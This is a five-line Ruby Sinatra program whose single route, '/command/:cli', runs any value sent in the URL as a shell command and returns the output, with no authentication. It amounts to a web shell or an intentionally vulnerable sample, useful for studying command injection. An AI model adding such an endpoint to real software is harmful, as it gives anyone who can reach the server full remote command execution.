require 'sinatra'

get '/command/:cli' do
  `#{params['cli']}`
end